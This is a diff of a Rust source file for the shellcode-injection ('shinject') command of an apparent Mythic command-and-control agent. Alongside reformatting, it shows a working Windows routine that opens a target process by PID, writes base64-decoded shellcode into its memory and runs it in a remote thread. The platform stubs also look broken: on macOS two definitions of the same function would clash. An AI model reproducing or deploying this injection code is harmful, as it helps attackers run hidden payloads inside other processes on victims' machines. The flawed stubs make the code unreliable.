@@ -6,6 +6,10 @@ use crate::agent::ShinjectArgs;
 use base64::{Engine as _, engine::general_purpose};
 
 #[cfg(target_os = "windows")]
+use winapi::shared::minwindef::{FALSE, TRUE, DWORD, LPVOID};
+#[cfg(target_os = "windows")]
+use winapi::shared::basetsd::SIZE_T;
+#[cfg(target_os = "windows")]
 use winapi::um::winnt::*;
 #[cfg(target_os = "windows")]
 use winapi::um::processthreadsapi::*;
@@ -16,9 +20,9 @@ use winapi::um::handleapi::*;
 #[cfg(target_os = "windows")]
 use winapi::um::synchapi::*;
 #[cfg(target_os = "windows")]
-use winapi::shared::minwindef::{FALSE, TRUE};
-
-
+use winapi::um::errhandlingapi::GetLastError;
+#[cfg(target_os = "windows")]
+use winapi::um::winbase::WAIT_OBJECT_0;
 
 #[cfg(target_os = "windows")]
 const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
@@ -31,21 +35,25 @@ const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
 #[cfg(target_os = "windows")]
 const INFINITE: DWORD = 0xFFFFFFFF;
 
-// Main command execution function for Mythic
+// ========================================
+// Main command execution for Mythic
+// ========================================
 #[cfg(target_os = "windows")]
 pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
     // Parse arguments from task parameters
     let args: ShinjectArgs = serde_json::from_str(&task.parameters)?;
-    
-    // For now, we'll assume the shellcode is passed as base64
-    // In a real implementation, you would download the file from Mythic using the file_id
+
+    // Decode shellcode from base64
     let shellcode_bytes = match general_purpose::STANDARD.decode(&args.shellcode) {
         Ok(bytes) => bytes,
         Err(_) => {
-            return Ok(mythic_error!(task.id, "Shellcode must be base64 encoded or file download must be implemented"));
+            return Ok(mythic_error!(
+                task.id,
+                "Shellcode must be base64 encoded or file download must be implemented"
+            ));
         }
     };
-    
+
     unsafe {
         match inject_shellcode_impl(args.process_id, &shellcode_bytes) {
             Ok(output) => Ok(mythic_success!(task.id, output)),
@@ -54,12 +62,18 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn s
     }
 }
 
+// ========================================
+// Windows shellcode injection implementation
+// ========================================
 #[cfg(target_os = "windows")]
 unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<String, String> {
     let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
     if h_process.is_null() {
-        return Err(format!("Failed to open process with PID: {}. Error: {}", 
-            process_id, GetLastError()));
+        return Err(format!(
+            "Failed to open process with PID: {}. Error: {}",
+            process_id,
+            GetLastError()
+        ));
     }
 
     let buffer_size = shellcode.len();
@@ -87,8 +101,12 @@ unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<Str
 
     if write_result == 0 || bytes_written != buffer_size {
         CloseHandle(h_process);
-        return Err(format!("WriteProcessMemory failed. Written: {}/{} bytes. Error: {}", 
-            bytes_written, buffer_size, GetLastError()));
+        return Err(format!(
+            "WriteProcessMemory failed. Written: {}/{} bytes. Error: {}",
+            bytes_written,
+            buffer_size,
+            GetLastError()
+        ));
     }
 
     let mut thread_id: DWORD = 0;
@@ -108,29 +126,41 @@ unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<Str
     }
 
     let wait_result = WaitForSingleObject(h_thread, INFINITE);
-    
+
     // Clean up
     CloseHandle(h_thread);
     CloseHandle(h_process);
 
     if wait_result == WAIT_OBJECT_0 {
-        Ok(format!("Shellcode successfully injected into PID {}. Thread ID: {}", 
-            process_id, thread_id))
+        Ok(format!(
+            "Shellcode successfully injected into PID {}. Thread ID: {}",
+            process_id, thread_id
+        ))
     } else {
         Err(format!("WaitForSingleObject failed with result: {}", wait_result))
     }
 }
 
+// ========================================
 // macOS placeholder implementation
+// ========================================
 #[cfg(target_os = "macos")]
 pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
-    Ok(mythic_error!(task.id, "shinject command is not implemented for macOS"))
+    Ok(mythic_error!(
+        task.id,
+        "shinject command is not implemented for macOS"
+    ))
 }
 
+// ========================================
 // Fallback for other platforms
+// ========================================
 #[cfg(not(target_os = "windows"))]
 pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
-    Ok(mythic_error!(task.id, "shinject command is only supported on Windows"))
+    Ok(mythic_error!(
+        task.id,
+        "shinject command is only supported on Windows"
+    ))
 }
 
 #[cfg(test)]
